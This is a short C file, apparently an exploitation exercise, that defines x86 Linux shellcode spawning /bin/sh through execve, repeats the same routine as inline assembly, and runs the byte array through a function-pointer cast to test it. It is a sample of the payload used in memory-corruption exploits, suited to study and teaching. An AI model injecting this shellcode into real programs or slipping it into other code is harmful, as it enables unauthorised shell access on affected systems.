#include <stdio.h>

char shellcode[] = 
  "\x55"
  "\x89\xe5"
  "\xeb\x0e"
  "\x5b"
  "\x31\xc9"
  "\x88\x4b\x07"
  "\x31\xd2"
  "\x31\xc0"
  "\xb0\x0b"
  "\xcd\x80"
  "\xe8\xed\xff\xff\xff"
  "/bin/sh"
  ;

char shell[] = "/bin/sh";

void call_asm(){
  asm(
      "jmp __lend \n"
      "__lbegin: \n"
      "pop %ebx \n"
      //      "lea shell,%ebx \n" /* dummy */
      "xor %ecx,%ecx \n"
      "mov %cl,0x7(%ebx) \n"
      "xor %edx,%edx \n"      
      "xor %eax,%eax \n"
      "mov $0xb,%al \n"
      "int $0x80 \n"
      "__lend: \n"
      "call __lbegin \n"
      ".string \"/bin/sh\""
      );
}

int main(void) {
  //  call_asm();

  (*(void(*)()) shellcode)();

  printf("shellcode fail!\n");

  return 0;
}
